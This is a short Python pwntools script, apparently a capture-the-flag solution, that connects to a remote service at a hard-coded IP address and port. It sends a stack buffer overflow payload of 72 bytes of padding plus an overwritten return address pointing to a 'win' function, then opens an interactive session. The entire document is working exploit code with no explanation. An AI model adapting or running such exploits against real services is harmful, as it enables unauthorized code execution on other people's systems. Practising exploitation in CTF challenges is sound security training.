from pwn import *

p = remote('47.83.170.192', 32806)

win = 0x401196
offset = 72

payload = b'A' * offset + p64(win)

p.sendlineafter(b'how long is your feedback?', str(len(payload)).encode())
p.sendafter(b'go ahead:', payload)

p.interactive()
